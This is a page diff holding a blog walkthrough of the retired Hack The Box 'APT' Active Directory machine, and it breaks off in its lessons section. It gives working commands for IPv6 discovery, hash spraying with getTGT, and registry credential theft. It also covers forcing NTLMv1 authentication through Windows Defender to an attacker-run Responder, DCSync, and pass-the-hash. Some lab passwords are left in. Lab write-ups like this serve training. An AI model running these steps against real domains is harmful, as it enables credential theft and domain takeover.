@@ -1,0 +1,455 @@
+1:"$Sreact.fragment"
+2:I[2509,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],""]
+3:I[6621,["509","static/chunks/509-dbc1ccf593ce6127.js","851","static/chunks/app/writing/%5Bslug%5D/page-bea6638222930ed2.js"],"MobileNavigation"]
+10:I[6025,[],"OutletBoundary"]
+11:"$Sreact.suspense"
+:HL["/writing/covers/hackthebox-apt-walkthrough.webp","image"]
+0:{"rsc":["$","$1","c",{"children":[[[["$","a",null,{"className":"skip-link","href":"#main-content","children":"Skip to content"}],["$","header",null,{"className":"site-header","children":["$","div",null,{"className":"shell header-inner","children":[["$","$L2",null,{"className":"brand","href":"/","aria-label":"CyberKareem home","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","nav",null,{"className":"desktop-nav","aria-label":"Primary navigation","children":[["$","a","/research",{"href":"/research","children":"Research"}],["$","a","/services",{"href":"/services","children":"Services"}],["$","a","/writing",{"href":"/writing","aria-current":"page","children":"Writing"}],["$","a","/projects",{"href":"/projects","children":"Projects"}],["$","a","/about",{"href":"/about","children":"About"}]]}],["$","$L2",null,{"className":"utility-link","href":"/contact#assessment-enquiries","children":["Start an enquiry ",["$","span",null,{"aria-hidden":"true","children":"→"}]]}],["$","$L3",null,{"items":[{"label":"Research","href":"/research"},{"label":"Services","href":"/services"},{"label":"Writing","href":"/writing"},{"label":"Projects","href":"/projects"},{"label":"About","href":"/about"},{"label":"Contact","href":"/contact"}],"activePath":"/writing"}]]}]}]],["$","main",null,{"id":"main-content","tabIndex":-1,"className":"article-main","children":[["$","article",null,{"className":"writing-article","children":[["$","header",null,{"className":"article-hero shell","children":[["$","nav",null,{"className":"article-breadcrumb","aria-label":"Breadcrumb","children":[["$","$L2",null,{"href":"/writing","children":"Writing archive"}],["$","span",null,{"aria-hidden":"true","children":"/"}],["$","span",null,{"children":"Hack The Box"}]]}],["$","p",null,{"className":"page-eyebrow","children":"Hack The Box"}],["$","h1",null,{"children":"Hack The Box: APT Walkthrough"}],["$","p",null,{"className":"article-dek","children":"An archived walkthrough of the retired Hack The Box APT machine, preserved from Abdullah Kareem's OSEP Prep preparation notes."}],["$","dl",null,{"className":"article-meta","children":[["$","div",null,{"children":[["$","dt",null,{"children":"Published"}],["$","dd",null,{"children":["$","time",null,{"dateTime":"2026-06-11T15:56:07.000Z","children":"11 Jun 2026"}]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Reading time"}],["$","dd",null,{"children":[16," minutes"]}]]}],["$","div",null,{"children":[["$","dt",null,{"children":"Author"}],["$","dd",null,{"children":"Abdullah Kareem"}]]}]]}],["$","figure",null,{"className":"article-cover article-cover-machine","children":[["$","div",null,{"className":"article-cover-art","children":["$","img",null,{"src":"/writing/covers/hackthebox-apt-walkthrough.webp","width":300,"height":300,"alt":"Hack The Box APT machine avatar","decoding":"async"}]}],["$","figcaption",null,{"children":[["$","span",null,{"children":"Official APT machine artwork, used for identification. Hack The Box is not affiliated with this archive."}],["$","a",null,{"href":"https://www.hackthebox.com/machines/apt","target":"_blank","rel":"nofollow noopener noreferrer","children":["Hack The Box machine artwork"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}]]}]]}]]}],["$","div",null,{"className":"article-rule"}],["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article provenance and review context","children":[["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Archive provenance"}],[["$","p",null,{"children":["Archived from public GitHub preparation notes"," on ","11 Jun 2026",". Added to CyberKareem on ","12 Jul 2026","."]}],["$","a",null,{"href":"https://github.com/CyberKareem/OSEP-Prep/blob/71e1e57087c98e9da9d75acf451b6e760a661d0b/HTB-APT.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision ",["$","span",null,{"aria-hidden":"true","children":"↗"}]]}],["$","small",null,{"children":["CyberKareem/OSEP-Prep"," · 71e1e57087c9",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["APT"," · Windows"," · Insane"," · Retired status verified 12 Jul 2026","."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/apt","target":"_blank","rel":"nofollow noopener noreferrer","children":["Open Hack The Box profile ","$L4"]}]]}],["$L5","$L6","$L7","$L8"]]}],"$L9"]}]]}],"$La"]}],"$Lb","$Lc"],null,"$Ld"]}],"isPartial":false,"staleTime":300,"varyParams":null,"buildId":"65jXSdzueZKnFbMeYrtpi"}
+4:["$","span",null,{"aria-hidden":"true","children":"↗"}]
+5:["$","div","lab-archive-0",{"className":"article-review-note article-review-lab-archive","children":[["$","span",null,{"children":"Archived, authorized retired-lab walkthrough"}],["$","p",null,{"children":"This personal lab note documents the officially retired Hack The Box APT machine. Retired status was verified on 12 July 2026. Use the techniques only on systems you own or have explicit permission to test."}],null]}]
+6:["$","div","source-context-1",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"GitHub archive context"}],["$","p",null,{"children":"Imported mechanically from Abdullah Kareem's public preparation notes. Commands and claims reflect the archived lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}]
+7:["$","div","editorial-correction-2",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"35 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]
+8:["$","div","technical-clarification-3",{"className":"article-review-note article-review-technical-clarification","children":[["$","span",null,{"children":"Technical clarification"}],["$","p",null,{"children":"Technical clarification: getTGT requests a legitimate TGT using supplied key material; it does not forge one. The lab's domain-controller computer account is unusually powerful because of its specific role, not because ordinary computer accounts are equivalent to Domain Admins."}],null]}]
+e:T7517,
+<p><strong>Target IP:</strong> <code>10.129.96.60</code><br /><strong>Kali IP:</strong> <code>10.10.17.27</code><br /><strong>Difficulty:</strong> Insane<br /><strong>OS:</strong> Windows Server 2016 (Active Directory Domain Controller)</p>
+<hr />
+
+
+
+<h2 id="overview-and-why-this-machine-is-unique">Overview &amp; Why This Machine Is Unique</h2>
+<p>APT is classified as <strong>Insane</strong> for several reasons that make it stand out from typical Windows AD boxes:</p>
+<h3 id="1-the-ipv4-trap">1. The IPv4 "Trap"</h3>
+<p>Most attackers scan IPv4 and assume they've seen all open ports. On APT, an IPv4 scan reveals only <strong>HTTP (80)</strong> and <strong>RPC (135)</strong>. The truly critical services — including SMB (445), LDAP, WinRM (5985), and Kerberos — are only accessible over <strong>IPv6</strong>. This forces you to discover and work with IPv6, a skill many pentesters neglect.</p>
+<h3 id="2-stale-backup-data">2. Stale Backup Data</h3>
+<p>The <code>backup.zip</code> on the SMB share contains an <strong>old backup</strong> of the Active Directory database (<code>ntds.dit</code>) and registry hives. The hashes inside are <strong>stale</strong> — some accounts changed passwords after the backup was taken. This means you cannot directly use most extracted hashes to log in. You must figure out which hashes are still valid through brute-force testing.</p>
+<h3 id="3-kerberos-ticket-forging-gettgt">3. Kerberos Ticket Forging (getTGT)</h3>
+<p>Instead of cracking passwords, you use <strong>password spraying with hashes</strong> against Kerberos. One of the stale hashes from the backup happens to still be valid for a different account, allowing you to forge a Kerberos Ticket Granting Ticket (TGT) for <code>henry.vinson</code>.</p>
+<h3 id="4-the-ntlmv1-downgrade-attack">4. The NTLMv1 Downgrade Attack</h3>
+<p>The machine's administrator intentionally downgraded the LAN Manager authentication level to <strong>2</strong>, forcing the system to use the weaker <strong>NTLMv1</strong> protocol. This allows you to capture a computer account (<code>APT$</code>) hash that can be cracked offline and then used to dump the entire domain.</p>
+<h3 id="5-living-off-the-land-for-privesc">5. Living-Off-the-Land for PrivEsc</h3>
+<p>Instead of uploading an exploit, you use <strong>Windows Defender itself</strong> (<code>MpCmdRun.exe</code>) to force the machine to authenticate back to your attacker machine. This is a "living off the land" technique that avoids antivirus detection.</p>
+<hr />
+<h2 id="step-1-initial-reconnaissance-and-the-ipv4-trap">Step 1: Initial Reconnaissance &amp; The IPv4 Trap</h2>
+<h3 id="what-we-do">What We Do</h3>
+<p>Run a standard TCP port scan against the target's IPv4 address.</p>
+<pre><code class="language-bash" data-language="bash">nmap -sV -v -p- --min-rate=10000 10.129.96.60
+</code></pre>
+<h3 id="what-we-see">What We See</h3>
+<pre><code>PORT    STATE SERVICE    VERSION
+80/tcp  open  tcpwrapped
+135/tcp open  tcpwrapped
+</code></pre>
+<h3 id="why-this-is-misleading">Why This Is Misleading</h3>
+<p>Only <strong>two ports</strong> are open on IPv4. Port 80 is a generic IIS web server. Port 135 is MSRPC. There is no SMB, no LDAP, no WinRM — the classic Windows attack surface seems missing. Many attackers would pivot to web exploitation at this point and waste hours.</p>
+<p><strong>The lesson:</strong> On modern Windows networks, IPv6 is often fully enabled and may expose a completely different attack surface than IPv4. Always check for IPv6 before concluding that a machine has limited services.</p>
+<hr />
+<h2 id="step-2-ipv6-discovery-ioxidresolver">Step 2: IPv6 Discovery (IOXIDResolver)</h2>
+<h3 id="what-we-do-2">What We Do</h3>
+<p>Use a Python script to query the MSRPC interface and ask the machine to reveal all of its network interfaces, including IPv6 addresses.</p>
+<pre><code class="language-bash" data-language="bash">git clone https://github.com/mubix/IOXIDResolver.git
+python3 IOXIDResolver/IOXIDResolver.py -t 10.129.96.60
+</code></pre>
+<h3 id="what-we-see-2">What We See</h3>
+<pre><code>[*] Retrieving network interface of 10.129.96.60
+Address: apt
+Address: 10.129.96.60
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::3d18:f278:e3b:8a82
+</code></pre>
+<h3 id="why-this-works">Why This Works</h3>
+<p>Windows RPC endpoint mapper (EPM) exposes an interface (<code>IOXIDResolver</code>) that can enumerate network interfaces. This is a legitimate Windows feature abused for reconnaissance. The machine happily tells us its IPv6 addresses.</p>
+<h3 id="what-we-do-next">What We Do Next</h3>
+<p>Add the IPv6 address to <code>/etc/hosts</code> so we can reference it by hostname (required for many tools like <code>smbclient</code> and Kerberos):</p>
+<pre><code class="language-bash" data-language="bash">echo "dead:beef::b885:d62a:d679:573f apt.htb apt.htb.local htb.local" | sudo tee -a /etc/hosts
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> Replace <code>dead:beef::b885:d62a:d679:573f</code> with the actual IPv6 address you discovered.</p>
+</blockquote>
+<hr />
+<h2 id="step-3-ipv6-port-scanning">Step 3: IPv6 Port Scanning</h2>
+<h3 id="what-we-do-3">What We Do</h3>
+<p>Scan all TCP ports over IPv6 using the hostname we just added.</p>
+<pre><code class="language-bash" data-language="bash">sudo nmap -6 --min-rate 3000 -p- -Pn -T4 -v apt.htb
+</code></pre>
+<h3 id="what-we-see-3">What We See</h3>
+<pre><code>PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+135/tcp   open  msrpc
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+</code></pre>
+<h3 id="why-this-changes-everything">Why This Changes Everything</h3>
+<p>Now we see the <strong>real</strong> machine: it's a <strong>Windows Domain Controller</strong> with Active Directory. The critical ports are:</p>
+<ul>
+<li><strong>445 (SMB)</strong> — File sharing, our initial entry point</li>
+<li><strong>389/636 (LDAP)</strong> — Directory services</li>
+<li><strong>5985/47001 (WinRM)</strong> — Windows Remote Management, our eventual shell protocol</li>
+<li><strong>88 (Kerberos)</strong> — Implied by AD presence, used for authentication</li>
+</ul>
+<p><strong>The lesson:</strong> If you only scan IPv4, you miss the entire attack surface of this machine. IPv6 is not just an alternative; it's the <strong>primary</strong> path.</p>
+<hr />
+<h2 id="step-4-smb-enumeration-over-ipv6">Step 4: SMB Enumeration Over IPv6</h2>
+<h3 id="what-we-do-4">What We Do</h3>
+<p>List available SMB shares using anonymous (null session) authentication.</p>
+<pre><code class="language-bash" data-language="bash">smbclient -L \\apt.htb -N
+</code></pre>
+<h3 id="what-we-see-4">What We See</h3>
+<pre><code>Sharename       Type      Comment
+---------       ----      -------
+backup          Disk
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share
+</code></pre>
+<h3 id="why-anonymous-smb-works">Why Anonymous SMB Works</h3>
+<p>Many AD environments allow anonymous enumeration of shares for legacy compatibility. The <code>backup</code> share name is immediately interesting — it suggests a backup of sensitive data.</p>
+<h3 id="what-we-do-next-2">What We Do Next</h3>
+<p>Connect to the <code>backup</code> share and look inside:</p>
+<pre><code class="language-bash" data-language="bash">smbclient \\apt.htb\backup -N
+smb: \&gt; dir
+</code></pre>
+<p>We see <code>backup.zip</code> (approx. 10MB). Download it:</p>
+<pre><code class="language-bash" data-language="bash">smb: \&gt; get backup.zip
+smb: \&gt; exit
+</code></pre>
+<hr />
+<h2 id="step-5-extracting-and-cracking-backup-zip">Step 5: Extracting &amp; Cracking backup.zip</h2>
+<h3 id="what-we-do-5">What We Do</h3>
+<p>Try to unzip the archive.</p>
+<pre><code class="language-bash" data-language="bash">unzip backup.zip
+</code></pre>
+<p>It prompts for a password. We need to crack it.</p>
+<h3 id="why-we-use-fcrackzip">Why We Use fcrackzip</h3>
+<p>The zip is password-protected. Since this is a CTF/machine, the password is REDACTED a common one found in wordlists.</p>
+<pre><code class="language-bash" data-language="bash">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip
+</code></pre>
+<h3 id="what-we-get">What We Get</h3>
+<pre><code>PASSWORD FOUND!!!!: pw == iloveyousomuch
+</code></pre>
+<h3 id="what-is-inside">What Is Inside</h3>
+<p>After extracting with the password:</p>
+<pre><code>Active Directory/ntds.dit      &lt;- Active Directory database
+Active Directory/ntds.jfm      &lt;- Transaction log
+registry/SECURITY              &lt;- Security hive
+registry/SYSTEM                &lt;- System hive
+</code></pre>
+<h3 id="why-these-files-matter">Why These Files Matter</h3>
+<ul>
+<li><strong><code>ntds.dit</code></strong> is the Active Directory database. It contains <strong>all domain user objects, password hashes, Kerberos keys, and group memberships</strong>.</li>
+<li><strong><code>SYSTEM</code></strong> hive contains the <strong>BOOTKEY</strong>, which is required to decrypt the password hashes inside <code>ntds.dit</code>.</li>
+<li>Without the <code>SYSTEM</code> hive, the <code>ntds.dit</code> hashes are unreadable.</li>
+</ul>
+<p><strong>The lesson:</strong> Always look for registry hives alongside <code>ntds.dit</code> backups. The <code>SYSTEM</code> hive is the decryption key.</p>
+<hr />
+<h2 id="step-6-dumping-hashes-from-ntds-dit">Step 6: Dumping Hashes from ntds.dit</h2>
+<h3 id="what-we-do-6">What We Do</h3>
+<p>Copy the files to our working directory and use <code>impacket-secretsdump</code> to extract all domain credentials.</p>
+<pre><code class="language-bash" data-language="bash">cp "Active Directory/ntds.dit" .
+cp registry/SYSTEM .
+impacket-secretsdump -ntds ntds.dit -system SYSTEM -outputfile user_hashes LOCAL
+</code></pre>
+<h3 id="what-we-get-2">What We Get</h3>
+<p>Three output files:</p>
+<ul>
+<li><code>user_hashes.ntds</code> — NTLM hashes (<code>username:rid:lmhash:nthash</code>)</li>
+<li><code>user_hashes.ntds.cleartext</code> — Any cleartext passwords</li>
+<li><code>user_hashes.ntds.kerberos</code> — Kerberos keys</li>
+</ul>
+<h3 id="why-this-works-2">Why This Works</h3>
+<p><code>impacket-secretsdump</code> reads the <code>ntds.dit</code> file, uses the <code>SYSTEM</code> hive to derive the BOOTKEY, and decrypts the password hashes stored in the database. This is a <strong>forensics technique</strong> applied to a live attack scenario.</p>
+<h3 id="what-the-dump-contains">What the Dump Contains</h3>
+<p>Our dump contains <strong>~2000 usernames</strong> from the domain. However, these hashes are from a <strong>backup</strong> — they may be stale.</p>
+<hr />
+<h2 id="step-7-user-enumeration-with-kerbrute">Step 7: User Enumeration with Kerbrute</h2>
+<h3 id="what-we-do-7">What We Do</h3>
+<p>Extract all unique usernames from the dump and validate which ones still exist in the <strong>live</strong> domain controller using Kerberos pre-authentication responses.</p>
+<pre><code class="language-bash" data-language="bash">cat user_hashes.ntds | cut -d':' -f1 | sort -u &gt; users.txt
+kerbrute userenum -d htb.local --dc apt.htb.local -o kerbrute.txt users.txt
+</code></pre>
+<h3 id="what-we-see-5">What We See</h3>
+<pre><code>[+] VALID USERNAME:	 Administrator@htb.local
+[+] VALID USERNAME:	 APT$@htb.local
+[+] VALID USERNAME:	 henry.vinson@htb.local
+</code></pre>
+<h3 id="why-kerbrute-is-critical">Why Kerbrute Is Critical</h3>
+<p>Out of 2000 dumped usernames, only <strong>3</strong> are still valid in the live domain. The rest may be deleted accounts, disabled users, or old data.</p>
+<p>Kerbrute works by sending Kerberos AS-REQ packets. If the KDC responds with <code>KDC_ERR_PREAUTH_REQUIRED</code>, the user exists. If it responds with <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>, the user does not exist. <strong>No authentication is needed</strong> — this is user enumeration via error messages.</p>
+<h3 id="why-we-care-about-henry-vinson">Why We Care About henry.vinson</h3>
+<p><code>Administrator</code> and <code>APT$</code> are expected. <code>henry.vinson</code> is a regular domain user who may have privileges or credentials we can use. He is our target for the next phase.</p>
+<hr />
+<h2 id="step-8-the-gettgt-brute-force">Step 8: The getTGT Brute Force</h2>
+<h3 id="what-we-do-8">What We Do</h3>
+<p>Try every unique hash from the <code>ntds.dit</code> dump to see if any can successfully request a Kerberos TGT for <code>henry.vinson</code>.</p>
+<pre><code class="language-bash" data-language="bash">cat user_hashes.ntds | awk -F':' '{printf "%s:%s\n",$3,$4}' | sort -u &gt; hashes.txt
+
+for i in $(cat hashes.txt); do
+    rm -f *.ccache 2&gt;/dev/null
+    echo "Testing: $i"
+    impacket-getTGT HTB.local/henry.vinson@apt.htb -hashes $i &gt;/dev/null 2&gt;&amp;1
+    if ls *.ccache 1&gt;/dev/null 2&gt;&amp;1; then
+        echo "HASH FOUND: [$i]"
+        ls -la *.ccache
+        break
+    fi
+done
+</code></pre>
+<h3 id="what-we-get-3">What We Get</h3>
+<pre><code>HASH FOUND: [[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]]
+[*] Saving ticket in henry.vinson@apt.htb.ccache
+</code></pre>
+<h3 id="why-this-is-weird-and-important">Why This Is Weird and Important</h3>
+<p>The hash that worked (<code>[redacted retired-lab hash or flag]</code>) is <strong>NOT</strong> the hash shown for <code>henry.vinson</code> in the backup dump (<code>[redacted retired-lab hash or flag]</code>). It is actually the <strong>live</strong> hash for <code>henry.vinson</code> in the current domain.</p>
+<p>This reveals a critical insight: <strong>the backup contains stale data</strong>, but it also happens to contain the current hash for <code>henry.vinson</code> among the thousands of entries. This is likely because the backup was taken at a point where some passwords were current.</p>
+<p><strong>The lesson:</strong> Never assume a backup is entirely useless just because it's old. Some credentials may still be valid, and brute-force testing against live services is the only way to confirm.</p>
+<h3 id="what-a-tgt-gets-us">What a TGT Gets Us</h3>
+<p>A Kerberos TGT (Ticket Granting Ticket) is like a "master ticket." With it, we can request service tickets for any service in the domain. In this case, we use it to authenticate to the Remote Registry service.</p>
+<hr />
+<h2 id="step-9-registry-dump-and-credential-discovery">Step 9: Registry Dump &amp; Credential Discovery</h2>
+<h3 id="what-we-do-9">What We Do</h3>
+<p>Export the TGT file path so Impacket uses it for authentication, then query the <code>HKU</code> (HKEY_USERS) hive remotely.</p>
+<pre><code class="language-bash" data-language="bash">export KRB5CCNAME=henry.vinson@apt.htb.ccache
+impacket-reg -k apt.htb.local query -keyName HKU -s &gt; registry.txt
+</code></pre>
+<h3 id="why-hku">Why HKU?</h3>
+<p><code>HKEY_USERS</code> contains the registry hives for all loaded user profiles on the system. When a user logs in, their <code>NTUSER.DAT</code> is loaded into <code>HKU\&lt;SID&gt;</code>. Software often stores credentials in the registry under the user's SID.</p>
+<h3 id="what-we-search-for">What We Search For</h3>
+<pre><code class="language-bash" data-language="bash">cat registry.txt | grep -i -A2 -B2 "henry"
+</code></pre>
+<h3 id="what-we-find">What We Find</h3>
+<pre><code>\S-1-5-21-2993095098-2100462451-206186470-1105\Software\GiganticHostingManagementSystem\
+	UserName	REG_SZ	 henry.vinson_adm
+	PassWord	REG_SZ	 G1#Ny5@2dvht
+</code></pre>
+<h3 id="why-this-works-3">Why This Works</h3>
+<p>The <code>GiganticHostingManagementSystem</code> application (referenced on the web server) stores its credentials in plain text in the registry. This is a classic example of <strong>credential harvesting</strong> from poorly secured applications.</p>
+<p>The SID (<code>S-1-5-21-...-1105</code>) belongs to <code>henry.vinson</code>, confirming these are his registry settings. The application uses a different account (<code>henry.vinson_adm</code>) with a different password.</p>
+<hr />
+<h2 id="step-10-user-shell-and-first-flag">Step 10: User Shell &amp; First Flag</h2>
+<h3 id="what-we-do-10">What We Do</h3>
+<p>Use <code>evil-winrm</code> to connect as <code>henry.vinson_adm</code> using the discovered password.</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i apt.htb -u henry.vinson_adm -p REDACTED
+</code></pre>
+<h3 id="why-evil-winrm">Why evil-winrm?</h3>
+<p>Port 5985 (WinRM) was discovered during our IPv6 scan. WinRM is Windows' remote management protocol (PowerShell remoting). <code>evil-winrm</code> is a specialized tool that provides an interactive PowerShell shell over WinRM.</p>
+<h3 id="why-this-account-works">Why This Account Works</h3>
+<p>From the registry dump, we have the <strong>plaintext password</strong>. Additionally, <code>henry.vinson_adm</code> is a member of the <strong>Remote Management Users</strong> group, which is required for WinRM access.</p>
+<h3 id="getting-the-flag">Getting the Flag</h3>
+<pre><code class="language-powershell" data-language="powershell">cat C:\Users\henry.vinson_adm\Desktop\user.txt
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>4c806[redacted]3a3fa0ce
+</code></pre>
+<hr />
+<h2 id="step-11-privilege-escalation-recon">Step 11: Privilege Escalation Recon</h2>
+<h3 id="what-we-do-11">What We Do</h3>
+<p>Check the PowerShell command history for the current user.</p>
+<pre><code class="language-powershell" data-language="powershell">type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+</code></pre>
+<h3 id="what-we-see-6">What We See</h3>
+<pre><code class="language-powershell" data-language="powershell">$Cred = get-credential administrator
+invoke-command -credential $Cred -computername localhost -scriptblock {
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force
+}
+</code></pre>
+<h3 id="why-this-is-the-key-to-root">Why This Is the Key to Root</h3>
+<p>The administrator deliberately set <code>lmcompatibilitylevel</code> to <strong>2</strong>.</p>
+<p>According to Microsoft documentation:</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Setting</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>2</td>
+<td>Send NTLM response only</td>
+<td>Client devices use <strong>NTLMv1</strong> authentication. Domain controllers accept LM, NTLM, and NTLLMv2.</td>
+</tr>
+</tbody></table>
+<p><strong>NTLMv1 is cryptographically weak.</strong> Unlike NTLMv2, which uses HMAC-MD5 and includes random challenges, NTLMv1 uses <strong>DES encryption</strong> with a static structure. If you know the challenge, you can crack an NTLMv1 response to recover the original NT hash.</p>
+<h3 id="the-attack-plan">The Attack Plan</h3>
+<ol>
+<li>Force the machine to authenticate to us over SMB</li>
+<li>Capture the NTLMv1 hash of a privileged account (ideally the computer account <code>APT$</code>)</li>
+<li>Crack the NTLMv1 hash offline to get the NT hash</li>
+<li>Use the NT hash with Pass-the-Hash to dump the entire domain</li>
+</ol>
+<hr />
+<h2 id="step-12-ntlmv1-hash-capture-with-responder">Step 12: NTLMv1 Hash Capture with Responder</h2>
+<h3 id="what-we-do-12">What We Do</h3>
+<p><strong>On Kali</strong>, configure and start Responder with a <strong>fixed challenge</strong>.</p>
+<pre><code class="language-bash" data-language="bash"># Edit Responder config
+sudo sed -i 's/Challenge = .*/Challenge = 1122334455667788/' /etc/responder/Responder.conf
+
+# Start Responder
+sudo responder --lm -I tun0
+</code></pre>
+<h3 id="why-a-fixed-challenge">Why a Fixed Challenge?</h3>
+<p>Responder normally uses a <strong>random challenge</strong> for each request. To crack NTLMv1 efficiently (especially with services like crack.sh), we need a <strong>known, fixed challenge</strong>. The challenge <code>1122334455667788</code> is the standard value used by precomputed cracking services.</p>
+<h3 id="what-we-do-on-the-target">What We Do On the Target</h3>
+<p>In the <code>evil-winrm</code> shell, force Windows Defender to scan a file on our SMB server:</p>
+<pre><code class="language-powershell" data-language="powershell">cd "C:\ProgramData\Microsoft\Windows Defender\platform"
+dir
+cd 4.18.2010.7-0
+.\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.17.27\file.txt
+</code></pre>
+<h3 id="why-windows-defender">Why Windows Defender?</h3>
+<p><code>MpCmdRun.exe</code> is the command-line interface for Windows Defender. When told to scan a <strong>network path</strong> (<code>\\10.10.17.27\file.txt</code>), the SYSTEM service attempts to connect to that SMB share. Since SMB connections are performed in the context of the <strong>computer account</strong> (<code>APT$</code>), we capture the <code>APT$</code> hash.</p>
+<p>This is <strong>living off the land</strong> — we use a legitimate, signed Microsoft binary to trigger authentication. No exploit, no payload, no antivirus alert.</p>
+<h3 id="what-responder-captures">What Responder Captures</h3>
+<pre><code>[SMB] NTLMv1 Client   : 10.129.96.60
+[SMB] NTLMv1 Username : HTB\APT$
+[SMB] NTLMv1 Hash     : APT$::HTB:[redacted encoded lab material]:[redacted encoded lab material]:1122334455667788
+</code></pre>
+<hr />
+<h2 id="step-13-cracking-the-ntlmv1-hash">Step 13: Cracking the NTLMv1 Hash</h2>
+<h3 id="what-we-submit">What We Submit</h3>
+<p>Go to <strong><a href="https://crack.sh/get-cracking/" target="_blank" rel="nofollow noopener noreferrer">https://crack.sh/get-cracking/</a></strong> and submit:</p>
+<pre><code>NTHASH:[redacted encoded lab material]
+</code></pre>
+<h3 id="what-we-get-back">What We Get Back</h3>
+<pre><code>Token: REDACTED encoded lab material]
+Key: [redacted retired-lab hash or flag]
+</code></pre>
+<h3 id="why-crack-sh-works">Why crack.sh Works</h3>
+<p>For the fixed challenge <code>1122334455667788</code>, crack.sh maintains <strong>precomputed rainbow tables</strong>. NTLMv1's weakness is that the response is deterministic given the challenge and the NT hash. By precomputing responses for common challenges, they can instantly reverse the hash without brute force.</p>
+<h3 id="the-resulting-hash">The Resulting Hash</h3>
+<p>The "Key" is the <strong>NT hash</strong> of the <code>APT$</code> account:</p>
+<pre><code>[redacted retired-lab hash or flag]
+</code></pre>
+<p>The full Pass-the-Hash format is:</p>
+<pre><code>[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]
+</code></pre>
+<p>(The first part is the empty LM hash, which is standard for modern Windows.)</p>
+<hr />
+<h2 id="step-14-domain-dump-as-apt">Step 14: Domain Dump as APT$</h2>
+<h3 id="what-we-do-13">What We Do</h3>
+<p>Use <code>impacket-secretsdump</code> with the <code>APT$</code> hash to perform a DCSync-style dump of the entire domain.</p>
+<pre><code class="language-bash" data-language="bash">impacket-secretsdump -hashes [redacted retired-lab hash or flag]:[redacted retired-lab hash or flag] 'HTB.local/APT$@apt.htb'
+</code></pre>
+<h3 id="why-apt-has-this-power">Why APT$ Has This Power</h3>
+<p>The <code>APT$</code> account is the <strong>computer account</strong> for the domain controller itself. Computer accounts are members of the <strong>Domain Controllers</strong> group and have the privileges needed to replicate directory data (DRSUAPI). By compromising the DC's computer account, we effectively compromise the domain.</p>
+<h3 id="what-we-get-4">What We Get</h3>
+<p>The full domain credential dump:</p>
+<pre><code>Administrator:500:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+Guest:501:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+krbtgt:502:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+henry.vinson:1105:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+henry.vinson_adm:1106:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+APT$:1001:[redacted retired-lab hash or flag]:[redacted retired-lab hash or flag]:::
+</code></pre>
+<h3 id="the-administrator-hash">The Administrator Hash</h3>
+<pre><code>[redacted retired-lab hash or flag]
+</code></pre>
+<hr />
+<h2 id="step-15-administrator-shell-and-root-flag">Step 15: Administrator Shell &amp; Root Flag</h2>
+<h3 id="what-we-do-14">What We Do</h3>
+<p>Use <code>evil-winrm</code> with Pass-the-Hash (<code>-H</code>) as Administrator.</p>
+<pre><code class="language-bash" data-language="bash">evil-winrm -i apt.htb -u Administrator -H [redacted retired-lab hash or flag]
+</code></pre>
+<h3 id="why-pass-the-hash-works">Why Pass-the-Hash Works</h3>
+<p>WinRM supports NTLM authentication. When we provide the NT hash instead of a password, the client performs the NTLM challenge-response protocol using the hash directly. The server verifies the response against its stored hash. Since we have the actual Administrator hash, authentication succeeds.</p>
+<h3 id="getting-the-flag-2">Getting the Flag</h3>
+<pre><code class="language-powershell" data-language="powershell">cat C:\Users\Administrator\Desktop\root.txt
+</code></pre>
+<p><strong>Result:</strong></p>
+<pre><code>08fdd[redacted]6deccb6e
+</code></pre>
+<hr />
+<h2 id="key-lessons-and-takeaways">Key Lessons &amp; Takeaways</h2>
+<h3 id="1-always-scan-ipv6">1. Always Scan IPv6</h3>
+<p>Modern Windows systems often have IPv6 fully enabled. A machine that appears "locked down" on IPv4 may expose its entire AD surface on IPv6. Use <code>IOXIDResolver</code> or other techniques to discover IPv6 addresses.</p>
+<h3 id="2-backup-data-is-gold-but-verify-it">2. Backup Data Is Gold — But Verify It</h3>
